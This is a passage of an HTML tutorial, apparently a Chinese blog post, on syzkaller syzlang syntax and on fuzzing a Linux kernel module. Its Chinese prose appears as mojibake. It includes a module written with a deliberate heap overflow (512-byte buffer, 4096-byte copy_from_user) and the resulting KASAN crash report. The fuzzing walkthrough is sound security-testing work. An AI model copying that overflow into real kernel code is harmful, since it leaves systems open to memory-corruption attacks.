class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„<code>write</code>ç³»ç»Ÿè°ƒç”¨ä¸­ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°çš„ç±»å‹ä¸º<code>len[buf]</code>ï¼Œè¿™é‡Œçš„å«ä¹‰è¡¨ç¤ºbufçš„é•¿åº¦ã€‚åœ¨ sock_fprog è¿™ä¸ªç»“æ„ä½“å½“ä¸­ï¼Œæˆ‘ä»¬ç»™å…¶å­—æ®µ len è®¾ç½®çš„å€¼ä¸ºå…¶ filter å­—æ®µçš„é•¿åº¦ï¼Œç±»å‹ä¸º int 16ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s1 &#123;</span><br><span class="line">    f0      len[s2]  <span class="meta"># length of s2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s2 &#123;</span><br><span class="line">    f0      s1</span><br><span class="line">    f1      <span class="built_in">array</span>[int32]</span><br><span class="line">    f2      len[parent, int32]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‹¥è¦è¡¨ç¤ºçˆ¶ç±»çš„é•¿åº¦ï¼Œå¯ä»¥ä½¿ç”¨ <code>len[parent, intN]</code>ï¼Œè‹¥è¦åœ¨ç»“æ„ä½“äº’ç›¸åµŒå…¥æ—¶è¡¨ç¤ºæ›´é¡¶å±‚çš„çˆ¶ç±»çš„é•¿åº¦ï¼Œå¯ä»¥æŒ‡å®šç‰¹å®šçˆ¶ç±»çš„ç±»å‹åç§°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">s1 &#123;</span><br><span class="line">aptr[in, s2]</span><br><span class="line">bptr[in, s3]</span><br><span class="line">c<span class="built_in">array</span>[int8]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s2 &#123;</span><br><span class="line">d<span class="built_in">array</span>[int8]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s3 &#123;</span><br><span class="line"># This refers to the <span class="built_in">array</span> c in the parent s1.</span><br><span class="line">elen[s1:c, int32]</span><br><span class="line"># This refers to the <span class="built_in">array</span> d in the sibling s2.</span><br><span class="line">flen[s1:a:d, int32]</span><br><span class="line"># This refers to the <span class="built_in">array</span> k in the child s4.</span><br><span class="line">glen[i:j, int32]</span><br><span class="line"># This refers to syscall argument l.</span><br><span class="line">hlen[syscall:l, int32]</span><br><span class="line">iptr[in, s4]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s4 &#123;</span><br><span class="line">j<span class="built_in">array</span>[int8]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(k ptr[in, s1], l ptr[in, <span class="built_in">array</span>[int8]])</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹å‡ºlenä¹Ÿé€‚ç”¨äºæ›´ä¸ºå¤æ‚çš„è·¯å¾„å¯»å€ã€‚</p><h3 id="è¿›ç¨‹"><a href="#è¿›ç¨‹" class="headerlink" title="è¿›ç¨‹"></a>è¿›ç¨‹</h3><p><code>proc</code> ç±»å‹ç”¨äºè¡¨ç¤ºæ¯ä¸ªè¿›ç¨‹çš„æ•°å€¼ã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºæ¯ä¸ªæ‰§è¡Œè€…æä¾›ä¸€ä¸ªå•ç‹¬çš„æ•°å€¼èŒƒå›´ï¼Œè¿™æ ·ä»–ä»¬å°±ä¸ä¼šç›¸äº’å¹²æ‰°ã€‚</p><p>æœ€ç®€å•çš„ä¾‹å­æ˜¯ä¸€ä¸ªç«¯å£å·ã€‚<code>proc [20000, 4, int16be]</code> ç±»å‹æ„å‘³ç€æˆ‘ä»¬è¦ä» 20000 å¼€å§‹ç”Ÿæˆä¸€ä¸ª<code> int16be</code> æ•´æ•°ï¼Œå¹¶ä¸ºæ¯ä¸ªè¿›ç¨‹åˆ†é… 4 ä¸ªå€¼ã€‚å› æ­¤ï¼Œæ‰§è¡Œè€…ç¼–å· n å°†å¾—åˆ° <code>[20000 + n * 4, 20000 + (n + 1) * 4]</code> èŒƒå›´å†…çš„å€¼ã€‚</p><h3 id="æ•´å‹å¸¸é‡"><a href="#æ•´å‹å¸¸é‡" class="headerlink" title="æ•´å‹å¸¸é‡"></a>æ•´å‹å¸¸é‡</h3><p>æ•´å‹å¸¸é‡å¯ä»¥æŒ‡å®šä¸ºåè¿›åˆ¶ã€<code>0x</code> å¼€å¤´çš„åå…­è¿›åˆ¶ã€ç”¨å•å¼•å· <code>&#39;</code> åŒ…è£¹çš„å­—ç¬¦ï¼Œæˆ–è€…ä»å†…æ ¸å¤´æ–‡ä»¶ä¸­æå–å‡ºæ¥çš„ç”± <code>define</code> å®šä¹‰çš„å¸¸é‡ï¼ˆæ¯”å¦‚è¯´ <code>O_RDONLY</code>ï¼‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">foo(a <span class="keyword">const</span>[<span class="number">10</span>], b <span class="keyword">const</span>[<span class="number">-10</span>])</span><br><span class="line">foo(a <span class="keyword">const</span>[<span class="number">0xabcd</span>])</span><br><span class="line">foo(a int8[<span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;z&#x27;</span>])</span><br><span class="line">foo(a <span class="keyword">const</span>[PATH_MAX])</span><br><span class="line">foo(a ptr[in, <span class="built_in">array</span>[int8, MY_PATH_MAX]])</span><br><span class="line">define MY_PATH_MAXPATH_MAX + <span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><p>æè¿°æ–‡ä»¶è¿˜åŒ…æ‹¬ç”¨ä»¥è¿›è¡Œå†…æ ¸å¤´æ–‡ä»¶åŒ…å«çš„ <code>include</code> æŒ‡ä»¤ï¼Œç”¨ä»¥åŒ…å«å†…æ ¸å¤´æ–‡ä»¶ç›®å½•çš„ <code>incdir</code> æŒ‡ä»¤ï¼Œä»¥åŠç”¨ä»¥è®¾ç½®å¸¸é‡çš„ <code>define</code> æŒ‡ä»¤ã€‚</p><p>syzkaller executor è¿˜å®šä¹‰äº†ä¸€äº›ä¼ªç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æè¿°æ–‡ä»¶ä¸­ä½¿ç”¨è¿™äº›ä¼ªç³»ç»Ÿè°ƒç”¨ã€‚è¿™äº›ä¼ªç³»ç»Ÿè°ƒç”¨è¢«æ‰©å±•ä¸º C ä»£ç ï¼Œå¯ä»¥æ‰§è¡Œç”¨æˆ·è‡ªå®šä¹‰çš„ä¸€äº›æ“ä½œã€‚</p><h2 id="å°è¯•æ•æ‰ç®€å•æº¢å‡ºæ´"><a href="#å°è¯•æ•æ‰ç®€å•æº¢å‡ºæ´" class="headerlink" title="å°è¯•æ•æ‰ç®€å•æº¢å‡ºæ´"></a>å°è¯•æ•æ‰ç®€å•æº¢å‡ºæ´</h2><h3 id="syz-extract"><a href="#syz-extract" class="headerlink" title="syz-extract"></a>syz-extract</h3><p>ç¬¬ä¸€æ­¥æ˜¯ä»å†…æ ¸æºæ–‡ä»¶ä¸­æå–ç¬¦å·å¸¸é‡çš„å€¼ï¼š<code>syz-extract</code> ä¼šæ ¹æ® syzlang æ–‡ä»¶ä»å†…æ ¸æºæ–‡ä»¶ä¸­æå–å‡ºä½¿ç”¨çš„å¯¹åº”çš„å®ã€ç³»ç»Ÿè°ƒç”¨å·ç­‰çš„å€¼ï¼Œç”Ÿæˆ <code>.const</code> æ–‡ä»¶</p><h3 id="syz-sysgen"><a href="#syz-sysgen" class="headerlink" title="syz-sysgen"></a>syz-sysgen</h3><p>ç¬¬äºŒæ­¥ä¾¿æ˜¯å°†æè¿°ç¿»è¯‘æˆ Golang ä»£ç ï¼š<code>syz-sysgen</code> é€šè¿‡ syzlang æ–‡ä»¶ä¸ .const æ–‡ä»¶è¿›è¡Œè¯­æ³•åˆ†æä¸è¯­ä¹‰åˆ†æï¼Œç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘ï¼Œæœ€ç»ˆç”Ÿæˆä¾› syzkaller ä½¿ç”¨çš„ golang ä»£ç ï¼Œåˆ†ä¸ºå¦‚ä¸‹å››ä¸ªæ­¥éª¤ï¼š</p><ul><li>  <strong>assignSyscallNumbers</strong>ï¼šåˆ†é…ç³»ç»Ÿè°ƒç”¨å·ï¼Œæ£€æµ‹ä¸æ”¯æŒçš„ç³»ç»Ÿè°ƒç”¨å¹¶ä¸¢å¼ƒ</li><li>  <strong>patchConsts</strong>ï¼šå°† AST ä¸­çš„å¸¸é‡æ›¿æ¢ä¸ºå¯¹åº”çš„å€¼</li><li>  <strong>check</strong>ï¼šè¿›è¡Œè¯­ä¹‰åˆ†æ</li><li>  <strong>genSyscalls</strong>ï¼šä» AST ç”Ÿæˆ prog å¯¹è±¡</li></ul><h3 id="å®æˆ˜æµç¨‹"><a href="#å®æˆ˜æµç¨‹" class="headerlink" title="å®æˆ˜æµç¨‹"></a>å®æˆ˜æµç¨‹</h3><p>é¦–å…ˆç¼–å†™ä¸€ä¸ªå…·æœ‰æ¼æ´çš„é©±åŠ¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_NAME <span class="meta-string">&quot;intel_rapl_msrdv&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLASS_NAME <span class="meta-string">&quot;intel_rapl_msrmd&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_PATH <span class="meta-string">&quot;/dev/intel_rapl_msrdv&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> major_num;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">module_class</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">module_device</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *__<span class="title">file</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *__<span class="title">inode</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">test_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">test_exit</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">test_open</span><span class="params">(struct inode *, struct file *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">test_read</span><span class="params">(struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">test_write</span><span class="params">(struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">test_release</span><span class="params">(struct inode *, struct file *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">test_ioctl</span><span class="params">(struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">test_op</span> =</span></span><br><span class="line">    &#123;</span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">        .unlocked_ioctl = test_ioctl,</span><br><span class="line">        .open = test_open,</span><br><span class="line">        .read = test_read,</span><br><span class="line">        .write = test_write,</span><br><span class="line">        .release = test_release,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">test_open</span><span class="params">(struct inode *__inode, struct file *__file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">test_read</span><span class="params">(struct file *__file, <span class="keyword">char</span> __user *user_buf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *__loff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">test_write</span><span class="params">(struct file *__file, <span class="keyword">const</span> <span class="keyword">char</span> __user *user_buf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *__loff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *param;</span><br><span class="line"></span><br><span class="line">    param = kmalloc(<span class="number">512</span>, GFP_KERNEL);</span><br><span class="line">    copy_from_user(param, user_buf, <span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">test_release</span><span class="params">(struct inode *__inode, struct file *__file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">test_ioctl</span><span class="params">(struct file *__file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">test_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    major_num = register_chrdev(<span class="number">0</span>, DEVICE_NAME, &amp;test_op);</span><br><span class="line">    <span class="keyword">if</span> (major_num &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> major_num;</span><br><span class="line"></span><br><span class="line">    module_class = class_create(THIS_MODULE, CLASS_NAME);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(module_class))</span><br><span class="line">    &#123;</span><br><span class="line">        unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(module_class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    module_device = device_create(module_class, <span class="literal">NULL</span>, MKDEV(major_num, <span class="number">0</span>), <span class="literal">NULL</span>, DEVICE_NAME);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(module_device))</span><br><span class="line">    &#123;</span><br><span class="line">        class_destroy(module_class);</span><br><span class="line">        unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(module_device);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __file = filp_open(DEVICE_PATH, O_RDONLY, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(__file))</span><br><span class="line">    &#123;</span><br><span class="line">        device_destroy(module_class, MKDEV(major_num, <span class="number">0</span>));</span><br><span class="line">        class_destroy(module_class);</span><br><span class="line">        unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(__file);</span><br><span class="line">    &#125;</span><br><span class="line">    __inode = file_inode(__file);</span><br><span class="line">    __inode-&gt;i_mode |= <span class="number">0666</span>;</span><br><span class="line">    filp_close(__file, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">test_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    device_destroy(module_class, MKDEV(major_num, <span class="number">0</span>));</span><br><span class="line">    class_destroy(module_class);</span><br><span class="line">    unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(test_init);</span><br><span class="line">module_exit(test_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;196082&quot;</span>);</span><br><span class="line">MODULE_INFO(intree, <span class="string">&quot;Y&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå­˜åœ¨æ˜æ˜¾çš„å †æº¢å‡ºã€‚</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">obj-m += vuln_device.o</span><br><span class="line">CURRENT_PATH := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">LINUX_KERNEL := <span class="variable">$(<span class="built_in">shell</span> uname -r)</span></span><br><span class="line">LINUX_KERNEL_PATH := ~/linux-5.11</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">make -C <span class="variable">$(LINUX_KERNEL_PATH)</span> M=<span class="variable">$(CURRENT_PATH)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">make -C <span class="variable">$(LINUX_KERNEL_PATH)</span> M=<span class="variable">$(CURRENT_PATH)</span> clean</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¸Šè¿°çš„<code>Makefile</code>ç¼–è¯‘</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">include &lt;linux/fs.h&gt;</span><br><span class="line"></span><br><span class="line">resource fd_111[fd]</span><br><span class="line"></span><br><span class="line">open$test(file ptr[in, <span class="built_in">string</span>[<span class="string">&quot;/dev/intel_rapl_msrdv&quot;</span>]], flags flags[vuln_open_flags], mode flags[vuln_open_mode]) fd_111</span><br><span class="line">read$test(fd fd_111, buf buffer[out], count len[buf])</span><br><span class="line">write$test(fd fd_111, buf buffer[in], count len[buf])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vuln_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</span><br><span class="line">vuln_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH</span><br></pre></td></tr></table></figure><p>ç¼–å†™<code>syzlang</code>éšåæ”¾å…¥åˆ°<code>sys/linux/</code>ç›®å½•ä¸‹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make bin/syz-extract</span><br><span class="line">make bin/syz-sysgen</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ syz-extract å’Œ syz-sysgen</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/syz-extract -os linux -sourcedir <span class="string">&quot;~/linux-5.11&quot;</span> -arch amd64 vuln_test.txt</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>syz_extract</code>ç”Ÿæˆå¯¹åº”çš„<code>const</code>æ–‡ä»¶ï¼Œéšåé‡æ–°è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./bin/syz-sysgen</span><br><span class="line">make generate</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>éšåé…ç½®configæ–‡ä»¶</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;target&quot;</span>: <span class="string">&quot;linux/amd64&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;http&quot;</span>: <span class="string">&quot;127.0.0.1:56741&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;rpc&quot;</span>: <span class="string">&quot;127.0.0.1:0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;sshkey&quot;</span>: <span class="string">&quot;/media/psf/pwn/fuzz01/bullseye.id_rsa&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;workdir&quot;</span>: <span class="string">&quot;/media/psf/pwn/fuzz01&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;kernel_obj&quot;</span>: <span class="string">&quot;/home/parallels/linux-5.11&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;syzkaller&quot;</span>: <span class="string">&quot;/home/parallels/fuzz/gopath/syzkaller&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;sandbox&quot;</span>: <span class="string">&quot;setuid&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;isolated&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;enable_syscalls&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;open$test&quot;</span>,</span><br><span class="line">        <span class="string">&quot;read$test&quot;</span>,</span><br><span class="line">        <span class="string">&quot;write$test&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;vm&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;targets&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;127.0.0.1:10021&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;pstore&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">&quot;target_dir&quot;</span>: <span class="string">&quot;/home/fuzzdir&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;target_reboot&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå†™æ³•ä¸ä¸Šé¢ç•¥æœ‰ä¸åŒï¼Œä¸è¿‡çœ‹ä¸€ä¸‹æ˜¯æŒºå¥½ç†è§£çš„ã€‚å…¶ä¸­çš„<code>enable_syscalls</code>ä¸»è¦æ˜¯é™åˆ¶åªå…è®¸è°ƒç”¨ä»€ä¹ˆç³»ç»Ÿè°ƒç”¨ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./bin/syz-manager -config=/media/psf/pwn/fuzz01/config.json</span><br></pre></td></tr></table></figure><p>æœ€åé€šè¿‡ä¸Šè¿°å‘½ä»¤å¯åŠ¨fuzzã€‚</p><table><thead><tr><th>Descriptions</th><th>Count</th><th>Last Time</th><th>Report</th></tr></thead><tbody><tr><td>KASAN: slab-out-of-bounds Write in test_write</td><td>1</td><td>2023/11/10 16:31</td><td>reproducing</td></tr></tbody></table><p>å½“è·‘å‡ºä¸€ä¸ª<code>crash</code>ä¼šå‡ºç°å¦‚ä¸Šè¡¨æ 